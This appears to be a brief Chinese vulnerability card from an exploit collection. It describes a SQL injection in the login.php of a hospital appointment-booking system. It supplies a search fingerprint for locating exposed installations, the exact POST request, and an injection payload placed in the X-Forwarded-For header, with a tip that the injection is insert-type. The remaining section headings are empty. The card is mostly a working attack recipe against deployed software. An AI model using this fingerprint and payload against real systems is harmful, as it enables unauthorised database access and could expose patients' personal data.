# 挂号系统login.php存在SQL注入漏洞

- **系统**：挂号系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="res/img/ht_box_back.gif"`
- **请求**：`POST /m/login.php?op=login HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`x-forwarded-for: 127.0.0.1 'and exists(select * from mysql)-- 123`

**请求体 / payload**
```
username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
**注入为insert类型，请勿使用sqlmap**
>
```

**其他**
- 挂号系统login.php存在SQL注入漏洞: + 一、漏洞简介
+ 二、资产测绘
    - 三、漏洞复现
---